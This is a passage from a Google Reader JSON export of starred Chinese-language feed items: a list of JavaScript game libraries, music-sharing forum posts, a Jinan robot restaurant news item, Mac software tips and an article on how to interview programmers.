href=\"https://github.com/meltingice/CamanJS\">CamanJS</a> – Canvas上的一些滤镜</li>\n<li><a rel=\"nofollow\" href=\"https://github.com/millermedeiros/CanvasContext2DWrapper\">CanvasContext2DWrapper</a> – Method chaining for Canvas</li>\n</ul>\n<h3>WebGL</h3>\n<ul>\n<li><a rel=\"nofollow\" href=\"https://github.com/onegeek/webglu\">WebGLU</a> – WebGL helpers</li>\n</ul>\n<h3>Color</h3>\n<ul>\n<li><a rel=\"nofollow\" href=\"https://github.com/eligrey/color.js\">color.js</a> – 颜色管理工具。 MIT</li>\n</ul>\n<h4>Math</h4>\n<ul>\n<li><a rel=\"nofollow\" href=\"http://sylvester.jcoglan.com/\">Sylvester</a> – 数组和矩阵</li>\n</ul>\n<h4>其它</h4>\n<ul>\n<li><a rel=\"nofollow\" href=\"http://www.playmycode.com/\">PlayMyCode</a> – 在线游戏社区。使用 Quby (像Ruby) 编译成JavaScript.</li>\n<li><a rel=\"nofollow\" href=\"http://www.spheredev.org/\">Sphere RPG Engine</a> – 为 RPG 游戏设计。使用 JavaScript</li>\n<li><a rel=\"nofollow\" href=\"http://playtomic.com/\">playtomic</a> – Commercial service providing analytics, leaderboards etc. services for games. Provides HTML5/JS API in addition to AS2/AS3 ones.</li>\n</ul>\n<p>(全文完)</p>\n<h3>相关文章</h3><ul><li>2010年12月31日 -- <a rel=\"nofollow\" href=\"http://coolshell.cn/articles/3437.html\" title=\"一些杂项资源\">一些杂项资源</a></li><li>2010年11月05日 -- <a rel=\"nofollow\" href=\"http://coolshell.cn/articles/3267.html\" title=\"游戏Flash vs HTML5\">游戏Flash vs HTML5</a></li><li>2010年09月21日 -- <a rel=\"nofollow\" href=\"http://coolshell.cn/articles/2998.html\" title=\"HTML5 小游戏展示\">HTML5 小游戏展示</a></li><li>2010年07月11日 -- <a rel=\"nofollow\" href=\"http://coolshell.cn/articles/2593.html\" title=\"Web版的VNC\">Web版的VNC</a></li><li>2010年06月24日 -- <a rel=\"nofollow\" href=\"http://coolshell.cn/articles/2524.html\" title=\"几个Web的资源\">几个Web的资源</a></li><li>2010年06月03日 -- <a rel=\"nofollow\" href=\"http://coolshell.cn/articles/2497.html\" title=\"把Flash转成Javascript/HTML5\">把Flash转成Javascript/HTML5</a></li><li>2011年01月18日 -- <a rel=\"nofollow\" href=\"http://coolshell.cn/articles/3480.html\" title=\"一些有意思的网站和贴子\">一些有意思的网站和贴子</a></li></ul>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://editor.bullog.org/",
      "title" : "牛博山寨 编辑推荐",
      "htmlUrl" : "http://bullog.org/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1294038813640",
    "timestampUsec" : "1294038813640533",
    "id" : "tag:google.com,2005:reader/item/995aab603547028c",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "欧美音乐大碟" ],
    "title" : "Maria Mena &lt;Apparently Unaffected&gt;&lt;Another Phase&gt; 附一单曲 创作才女 补全 [GK]",
    "published" : 1294038813,
    "updated" : 1294038813,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-49523.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "WARNING:  OppsU&#39;s albums, singles, EPs &amp; MVs are NOT ALLOWED to  be REPOSTED to other  forums and blogs ,  otherswise your ID &amp; IP will be blocked FOREVER!!!\nOppsU！的资源未经发帖人同意严禁无良转载到其他AAC论坛, 某些论坛的AAC区, 博客等 \n\n♪封 .."
    },
    "author" : "jaysean",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-17.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oopmei.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1293857193941",
    "timestampUsec" : "1293857193941246",
    "id" : "tag:google.com,2005:reader/item/46e8120b194711a6",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "entertainment" ],
    "title" : "济南大陆机器人餐厅开业",
    "published" : 1293621000,
    "updated" : 1293621000,
    "alternate" : [ {
      "href" : "http://science.solidot.org/article.pl?sid=10/12/29/1124216&amp;from=rss",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "首家机器人餐厅“大陆机器人体验馆”本月初在济南开张。 这是一家火锅自助餐厅，餐桌呈同心椭圆形摆设，两个椭圆之间有黑白相间的“跑道”，机器人沿着白色塑胶带送餐。塑胶带上有自动定位装置，使机器人能够准确停在餐桌旁边，客人可以自己取餐。目前的机器人，包括2个穿着红色旗袍的美女迎宾机器人、2个穿着白色纱裙的舞蹈机器人、一个“瓦力”机器人，还有7个机器人服务员。每个机器人的造价从5万元到20万元不等。机器人都装有感应系统，遇到障碍物会自动停下，以免与客人发生碰撞。视频（Youtube）<div>\n<a href=\"http://feeds.feedburner.com/~ff/solidot?a=vQ0qYeD79F4:3CdFKyjeJBk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/solidot?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/solidot?a=vQ0qYeD79F4:3CdFKyjeJBk:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/solidot?d=7Q72WNTAKBA\" border=\"0\"></a>\n</div>"
    },
    "author" : "blackhat",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/solidot",
      "title" : "Solidot",
      "htmlUrl" : "http://www.solidot.org"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1293856097410",
    "timestampUsec" : "1293856097410249",
    "id" : "tag:google.com,2005:reader/item/d9dd4ba09b044dec",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "life", "movies" ],
    "title" : "啥都不说了",
    "published" : 1293540024,
    "updated" : 1293540024,
    "alternate" : [ {
      "href" : "http://forresty.com/2010/12/28/nothing-to-say/",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>没看过这几部电影的人，建议有时间都去看看吧。</p>\n<p>《<a href=\"http://movie.douban.com/subject/1309046/\">V字仇杀队</a>》</p>\n<p>《<a href=\"http://movie.douban.com/subject/1292224/\">飞越疯人院</a>》</p>\n<p>《<a href=\"http://movie.douban.com/subject/1900841/\">窃听风暴</a>》</p>"
    },
    "author" : "阿福",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://forresty.com/feed/",
      "title" : "Forrest Ye | 阿福",
      "htmlUrl" : "http://forresty.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1292986682600",
    "timestampUsec" : "1292986682600710",
    "id" : "tag:google.com,2005:reader/item/229a5713b644aad0",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Mac 软件共享" ],
    "title" : "proxifier,mac 下的sockscape",
    "published" : 1292342022,
    "updated" : 1292342022,
    "alternate" : [ {
      "href" : "http://bbs.macidea.com/viewthread.php?tid=38516",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "[i=s] 本帖最后由 麦客纯粹 于 10/12/15 12:33 PM 编辑 [/i]\n\n如果你装了picasa for mac ，你会发现无论如何都登录不上网络相册，因为被阝可 土啬 给墙了，解决方法就是安装这个 &amp;#160;proxifier ，在proxy setting中设置好你的代理服务器，socks5，然后在proxification rule ..."
    },
    "author" : "asics",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.macidea.com/rss.php?fid=14&auth=b6a0IUCyv%2BVQa%2BrTTTcqsrmvfEClRHf13U8RyW%2BTYctno8vl3hvkSj6G70yjowg",
      "title" : "MacIdea - Mac 软件共享",
      "htmlUrl" : "http://mac.pcbeta.com/forumdisplay.php?fid=14"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1292949213281",
    "timestampUsec" : "1292949213281709",
    "id" : "tag:google.com,2005:reader/item/d312a5d5dbdcde75",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "视频", "搞笑", "有趣" ],
    "title" : "史上最给力的滑冰选手，注意三十秒之后",
    "published" : 1292554806,
    "updated" : 1292554806,
    "alternate" : [ {
      "href" : "http://luo.bo/3556/",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<div align=\"center\"></div><p><span></span><br> <a href=\"http://luo.bo/3556/\"><img src=\"http://dulei.si/files/5adffdb38d32f412e131b51b9a014f94.jpg\" alt=\"\" border=\"\"></a></p><p>如果您的阅读器看不到视频，请移步原文链接: <a href=\"http://luo.bo/3556/\">http://luo.bo/3556/</a> <br> <a href=\"http:////luo.bo/\" title=\"萝卜网 - 人人都是艺术家\">萝卜网</a> Copyright ©   2010 - 2012 分享国内外精彩网事。<br> 更多精彩欢迎您订阅 <a href=\"http://feeds.feedburner.com/tamd\">http://feeds.feedburner.com/tamd</a>，欢迎网友<a href=\"http://luo.bo/delivery/\">投稿</a>推荐文章。<br> 广告一则： <a href=\"http://zi.mu/domain\"><font color=\"red\">.me 域名全国最低价，首年仅需45元，续费130元促销中！</font></a><br> 本站导航： <a href=\"http://luo.bo/\">萝卜网</a> | <a href=\"http://tao.luo.bo/\">淘宝导购</a> | <a href=\"http://v2.luo.bo/\">在线视频</a>| <a href=\"http://v.luo.bo/\">视频搜索</a><br> <a href=\"http://zi.mu/linost\" title=\"Linost\"><img src=\"http://dulei.si/files/966647b88eb7c4530535056df8d2d83f.gif\" alt=\"Linost\" border=\"0\"></a><table cellspacing=\"0\" cellpadding=\"3\" border=\"0\"><tr><td colspan=\"5\"><b><font size=\"-1\" style=\"display:block!important;padding:20px 0 5px!important\">您可能对以下文章感兴趣：</font></b></td></tr><tr><td width=\"106\" valign=\"top\" style=\"padding:5px!important;margin:0!important\"> <a title=\"如果有一天我突然用很奇怪的内容联系你，记得来救我。。女性尤其要看看...\" style=\"text-decoration:none!important\" href=\"http://www.wumii.com/ext/redirect.htm?url=http%3A%2F%2Fluo.bo%2F1545%2F&amp;from=http%3A%2F%2Fluo.bo%2F3556%2F\"> <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:100px!important;height:100px!important\" src=\"http://dulei.si/files/629970065d0131fcb5d2e16e9bb48067.jpg\" width=\"100px\" height=\"100px\"><br> <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:106px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">如果有一天我突然用很奇怪的内容联系你，记得来救我。。女性尤其要看看...</font> </a></td><td width=\"106\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\"> <a title=\"史上最毒舌评委气跑选手\" style=\"text-decoration:none!important\" href=\"http://www.wumii.com/ext/redirect.htm?url=http%3A%2F%2Fluo.bo%2F2843%2F&amp;from=http%3A%2F%2Fluo.bo%2F3556%2F\"> <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:100px!important;height:100px!important\" src=\"http://static.wumii.com/site_images/2010/11/22/1040853.jpg\" width=\"100px\" height=\"100px\"><br> <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:106px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">史上最毒舌评委气跑选手</font> </a></td><td width=\"106\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\"> <a title=\"史上最强的快男选手，评委要求验明正身\" style=\"text-decoration:none!important\" href=\"http://www.wumii.com/ext/redirect.htm?url=http%3A%2F%2Fluo.bo%2F452%2F&amp;from=http%3A%2F%2Fluo.bo%2F3556%2F\"> <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:100px!important;height:100px!important\" src=\"http://static.wumii.com/site_images/2010/11/03/653900.jpg\" width=\"100px\" height=\"100px\"><br> <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:106px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">史上最强的快男选手，评委要求验明正身</font> </a></td><td width=\"106\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\"> <a title=\"芒果台女冲关选手落水不慎走光，注意29秒！\" style=\"text-decoration:none!important\" href=\"http://www.wumii.com/ext/redirect.htm?url=http%3A%2F%2Fluo.bo%2F1588%2F&amp;from=http%3A%2F%2Fluo.bo%2F3556%2F\"> <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:100px!important;height:100px!important\" src=\"http://static.wumii.com/site_images/2010/11/03/651929.jpg\" width=\"100px\" height=\"100px\"><br> <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:106px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">芒果台女冲关选手落水不慎走光，注意29秒！</font> </a></td><td width=\"106\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\"> <a title=\"史上最强后空翻\" style=\"text-decoration:none!important\" href=\"http://www.wumii.com/ext/redirect.htm?url=http%3A%2F%2Fluo.bo%2F227%2F&amp;from=http%3A%2F%2Fluo.bo%2F3556%2F\"> <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:100px!important;height:100px!important\" src=\"http://static.wumii.com/site_images/2010/11/03/654291.jpg\" width=\"100px\" height=\"100px\"><br> <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:106px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">史上最强后空翻</font> </a></td></tr><tr><td colspan=\"5\" align=\"right\"> <a style=\"text-decoration:none!important\" href=\"http://www.wumii.com/widget/relatedItems.htm\" title=\"无觅相关文章插件\"> <font size=\"-1\" color=\"#bbbbbb\" style=\"display:block!important;font-family:arial!important;padding:5px 0!important;font-size:12px!important;color:#bbb!important\">无觅</font> </a></td></tr></table>\n<p><a href=\"http://feedads.g.doubleclick.net/~a/dWTbyQDCCCozRoejPGdqM09_6cc/0/da\"><img src=\"http://feedads.g.doubleclick.net/~a/dWTbyQDCCCozRoejPGdqM09_6cc/0/di\" border=\"0\" ismap></a><br>\n<a href=\"http://feedads.g.doubleclick.net/~a/dWTbyQDCCCozRoejPGdqM09_6cc/1/da\"><img src=\"http://feedads.g.doubleclick.net/~a/dWTbyQDCCCozRoejPGdqM09_6cc/1/di\" border=\"0\" ismap></a></p></p>"
    },
    "author" : "梁萧",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/tamd",
      "title" : "萝卜网",
      "htmlUrl" : "http://luo.bo"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1292933725458",
    "timestampUsec" : "1292933725458527",
    "id" : "tag:google.com,2005:reader/item/48f8fe2f3efb14b4",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "Mac 软件共享" ],
    "title" : "分享一个自我控制软件 Self Control",
    "published" : 1292752715,
    "updated" : 1292752715,
    "alternate" : [ {
      "href" : "http://bbs.macidea.com/viewthread.php?tid=38837",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "自制力一直很差，尤其是写文档需要查资料的时候，会情不自禁的被查资料的过程中所出现的乱七八糟网页所吸引走，很影响效率。\n\n直到我发现了 Self Control这个小软件\n\n<a href=\"https://skitch.com/tingpeng/rf2xj/window%5B/img%5D\">https://skitch.com/tingpeng/rf2xj/window[/img]</a>\n\n原理其实很简单，就是把你的所有网络给断掉，断网 ..."
    },
    "author" : "luxev",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.macidea.com/rss.php?fid=14&auth=b6a0IUCyv%2BVQa%2BrTTTcqsrmvfEClRHf13U8RyW%2BTYctno8vl3hvkSj6G70yjowg",
      "title" : "MacIdea - Mac 软件共享",
      "htmlUrl" : "http://mac.pcbeta.com/forumdisplay.php?fid=14"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1292892685855",
    "timestampUsec" : "1292892685855080",
    "id" : "tag:google.com,2005:reader/item/e66bf110a1431c62",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Mac 软件共享" ],
    "title" : "[ 转贴 ] 牛津高阶英汉双解词典（应该是已知最好排版了）",
    "published" : 1292543866,
    "updated" : 1292543866,
    "alternate" : [ {
      "href" : "http://www.macidea.com/viewthread.php?tid=38665",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "[i=s] 本帖最后由 hkenneth 于 10/12/18 12:36 PM 编辑 [/i]\n\n应该算是Mac OS X上排版最好的一个版本了。虽然还是有一部分排版错误，但是我尽量修正了。源文件没有音标，以上。（Mac上修改100Mb以上的文本真是吃力啊。）下载解压缩后直接复制到 /Users/YourUsername/Library/ ..."
    },
    "author" : "hkenneth",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.macidea.com/rss.php?fid=14&auth=b6a0IUCyv%2BVQa%2BrTTTcqsrmvfEClRHf13U8RyW%2BTYctno8vl3hvkSj6G70yjowg",
      "title" : "MacIdea - Mac 软件共享",
      "htmlUrl" : "http://mac.pcbeta.com/forumdisplay.php?fid=14"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1292777745603",
    "timestampUsec" : "1292777745603207",
    "id" : "tag:google.com,2005:reader/item/2a68c8991c1bf222",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "单曲EP好听分享" ],
    "title" : "Girlicious &lt;Over You - Single&gt;美味女孩,美味单曲! [115]免刀",
    "published" : 1292777745,
    "updated" : 1292777745,
    "alternate" : [ {
      "href" : "http://oppsu.cn.tel2.artyoo.cn/read.php?tid-45462.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "http://ukl6yg.blu.livefilestore.com/y1p0mc8jpkAjN-FQ9nS5HUQ0ZighJ8QoQPkGq4D5iPNVAePdWuwc5sUFKObIQrAz3Pmzn8fOC1oxCcp9_82lbe71ogRh6iUisQP/Over%20You%20-%20Single.jpg?psid=1 \n\n美味女孩(Girlicious)\n\nGirlicious是一个来自美国的流行女子团体, 由四位美女组成，分别是Nichole Cordova，Tiffanie Anderson，Chrys .."
    },
    "author" : "bevenolo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1292777672284",
    "timestampUsec" : "1292777672284617",
    "id" : "tag:google.com,2005:reader/item/ec82090052a9dd78",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "单曲EP好听分享" ],
    "title" : "Kevin Rudolf &lt;I Made It (Cash Money Heroes) [Acoustic] - Single&gt; 抒情版 很好听 [DB]",
    "published" : 1292777672,
    "updated" : 1292777672,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-47209.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "  \n\n原版单曲 见Jay Sean 的大合集\n\n\n谢绝转载\n\n\n 涛哥推荐  \nhttp://i1037.photobucket.com/albums/a459/justinkuo/e9023bc5.jpg   http://i1037.photobucket.com/albums/a459/justinkuo/small%20pic%202/96c6877e.jpg   http://i1037.photobucket.com/albums/a459/justinkuo/s .."
    },
    "author" : "justinkuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1292777624329",
    "timestampUsec" : "1292777624329446",
    "id" : "tag:google.com,2005:reader/item/bcff03bea2aafe5d",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "欧美音乐大碟" ],
    "title" : "Simone White &lt;Yakiimo&gt; 清新吉他女生 [115]",
    "published" : 1292777624,
    "updated" : 1292777624,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-47358.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "最新的omega ladymalic广告的主题曲 安静的声音非常推荐\n\n \n\nSimone White，1970年出生于夏威夷瓦胡岛。\n根据她的自述，Simone White全家都好像和音乐有关系。她奶奶是一位剧台歌手和舞者。阿姨在50年代写流行歌。妈妈以前则是一位跳芭蕾的民谣歌手，现在是演员。爸爸也一直是演戏的。童年就好像是迁徙的小鸟，大约8个月时 .."
    },
    "author" : "amicole",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-17.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oopmei.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1292777613161",
    "timestampUsec" : "1292777613161678",
    "id" : "tag:google.com,2005:reader/item/cc35d6837e540393",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "单曲EP好听分享" ],
    "title" : "JW&lt;JW First - EP&gt;卫兰师妹[115]",
    "published" : 1292777613,
    "updated" : 1292777613,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-47421.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "JW First - EP 封面：\n  \n曲目：\n  \n\n自购自美国区，正版身份认证：\n  \n介绍：\n\n  JW 是黎明公司旗下女新人,目前并没有公开她的照片 JW，A-music 2010年度重点新人，继卫兰后又一位『先声夺人』的乐坛新人。由雷颂德监制，以及陈奂仁、林夕和李峻一等著名音乐人度身订做六首新歌，5月JW发表第一首歌曲「挂念好友 .."
    },
    "author" : "hmz1201",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1292777544683",
    "timestampUsec" : "1292777544683858",
    "id" : "tag:google.com,2005:reader/item/bd6dc734cd1709e4",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Mac 软件共享" ],
    "title" : "iPhone / ipod / ipad 视频(MP4/M4V)添加软字幕工具──Muxo",
    "published" : 1292652145,
    "updated" : 1292652145,
    "alternate" : [ {
      "href" : "http://www.macidea.com/viewthread.php?tid=38763",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "字幕分为”硬字幕”和”软字幕”两种, 硬字幕是在制作视频时把字幕和图像合成到一起, 字幕无法分离, 在播放时也不能关闭. 而软字幕是*于视频的一些文本格式的字幕文件, 如srt, ass等, 可以对其进行修改, 编辑等, 也可以在播放时打开或关闭字幕. 目前流行的软字幕大多是外挂软 ..."
    },
    "author" : "angusshen",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.macidea.com/rss.php?fid=14&auth=b6a0IUCyv%2BVQa%2BrTTTcqsrmvfEClRHf13U8RyW%2BTYctno8vl3hvkSj6G70yjowg",
      "title" : "MacIdea - Mac 软件共享",
      "htmlUrl" : "http://mac.pcbeta.com/forumdisplay.php?fid=14"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1292574496759",
    "timestampUsec" : "1292574496759262",
    "id" : "tag:google.com,2005:reader/item/7b78a6753d526015",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/tracking-mobile-read", "Startup" ],
    "title" : "如何面试程序员？",
    "published" : 1292482626,
    "updated" : 1292482626,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2010/12/how_to_interview_a_programmer.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>你要面试一个程序员，应该问他什么问题？</p><p>有人在<a href=\"http://news.ycombinator.com/item?id=1984518\">Hacker News</a>的讨论区里，请求指点，怎么才能在面试中发现合格的人。众人纷纷出主意，有很多高质量的回帖，我觉得挺有启发，就整理出了下面这篇文章。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201012/bg2010121601.jpg\"></p>\n\n<p>===================================</p>\n\n<p><strong>如何面试程序员？</strong></p>\n\n<p>阮一峰 整理</p>\n\n<p><br>\n<strong>一、提问之前的准备</strong></p>\n\n<p>首先，最重要的是，你自己一开始就应该想清楚：</p>\n\n<blockquote>\n\n<p>　　1. 需要新员工完成什么样的任务？</p>\n\n<p>　　2. 怎样的人能完成这样的任务？</p>\n\n<p>　　3. 哪些途径和方法可以发现这样的人？</p>\n\n</blockquote>\n\n<p>只有明确这些根本性的问题，才能正确高效地完成面试。</p>\n\n<p><strong>二、提问的原则</strong></p>\n\n<p>假定你对上一节的三个问题，已经有了清晰的想法，那么接下来就可以设计如何提问了。</p>\n\n<p>有一些提问的原则，是你应该遵循的：</p>\n\n<blockquote>\n\n<p>　　* 每一个面试问题都有明确的目的。你不仅自己了解，还能向其他面试官解释清楚。</p>\n\n<p>　　* 多提一些开放性（Open-ended）的问题，而不是那种用Yes/No就可以回答的问题。这样做使你有机会与面试者展开讨论，并且提出后续的问题，尽可能多地了解对方。</p>\n\n<p>　　* 不要问宗教、家庭、健康、个人隐私等方面的问题。</p>\n\n<p>　　* 不要问太复杂的问题。因为面试者没有太多思考时间，所以无法周全地回答，你也就无从判断他的能力了。</p>\n\n</blockquote>\n\n<p><strong>三、考察专业能力</strong></p>\n\n<p>为了确认面试者是胜任的，你可以问一些与职位相关的专业方面的问题。（不过通常来说，一次面试不足以看出一个人的专业能力。）</p>\n\n<p>比如，你的招聘职位是系统管理员，你可以问\"如何快速地在50台机器上部署Linux？\"（提示：正确答案不是刻录50张安装光盘。）</p>\n\n<p>另外，你还应该向面试者了解他的过去，因为过去是未来的最好预测依据。不过，提问的重点不要仅仅是他过去的成果，更要关注在当时的环境中，他是如何决策和实施的。</p>\n\n<p><strong>四、考察综合素质</strong></p>\n\n<p>因为人是会发展的，所以某种程度上，面试者的综合素质要比他的专业能力更重要。</p>\n\n<p>所以，具体的技术问题（如何调用API、什么是设计模式、编程语言的语法等等）可以少问一些，更应该关注面试者的事业心、对工作的热情、进取心、自律能力、毅力等方面。</p>\n\n<p>下面是一些典型问题：</p>\n\n<blockquote>\n\n<p>　　Why did you get into development?<br>\n　　你为什么开发软件？</p>\n\n<p>　　How many technical books did you read in the past year?<br>\n　　去年你读了几本技术书籍？</p>\n\n<p>　　What was your favorite technical book in the past year? What did you learn from it?<br>\n　　去年你最喜欢的技术书籍是哪本？你从中学到了什么？</p>\n\n<p>　　What websites do you read regularly, related to development?<br>\n　　平时你经常访问哪些编程类网站？</p>\n\n<p>　　Do you maintain any open-source projects?<br>\n　　你有自己的开源项目吗？</p>\n\n<p>　　Do you code in your spare-time?<br>\n　　业余时间你编程吗？</p>\n\n<p>　　Do you love programming, or do you do it for the money?<br>\n　　对于你来说，编程是一种爱好，还是一种谋生手段？</p>\n\n<p>　　Have you accomplished anything important in your career yet? Do you want to? <br>\n　　你的职业生涯之中有什么重要的成就？它是你主导的吗？</p>\n\n<p>　　What would make you feel that you have done something important?<br>\n　　什么事情会让你很有成就感？</p>\n\n</blockquote>\n\n<p><strong>五、考察理性思维</strong></p>\n\n<p>某些情况下，你可能需要了解面试者的分析判断能力，看他能否全面地思考问题、客观地评价自己。</p>\n\n<p>那么，你可以依次提出这样三个问题：</p>\n\n<blockquote>\n\n<p>　　What's your favorite programming language? Why? <br>\n　　你最喜欢的编程语言是哪种？为什么？</p>\n\n<p>　　If you could add one feature to your favorite language, what would it be? Why?<br>\n　　如果允许你为这种语言加一种功能，你会加什么功能？为什么？</p>\n\n<p>　　If you could remove one feature from it, what would it be? Why?<br>\n　　如果允许你取消一种功能，会是什么功能？为什么？</p>\n\n</blockquote>\n\n<p>这里的重点是，让面试者从正反两方面评价一件自己熟悉的东西，看看他的思维是否片面。答案无所谓对错，只要面试者有一个明确的立场，能够从正反两方面说出令人信服的理由，就可以了。比如，某个软件的口碑不好，但是面试者说他很喜欢，而且说得出一大堆理由，清楚地解释了这种软件的优点和缺点在哪里，这样就很好。</p>\n\n<p>你还可以把这些问题，套用在其他东西上面，比如操作系统、文字编辑器等等。</p>\n\n<p>（完）<br>\n</p><p><iframe src=\"http://feedads.g.doubleclick.net/~ah/f/ejnc7ur4lnr9i3473l340ugd1o/300/250?ca=1&amp;fh=280#http%3A%2F%2Fwww.ruanyifeng.com%2Fblog%2F2010%2F12%2Fhow_to_interview_a_programmer.html\" width=\"100%\" height=\"280\" frameborder=\"0\" scrolling=\"no\" marginwidth=\"0\" marginheight=\"0\"></iframe></p>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
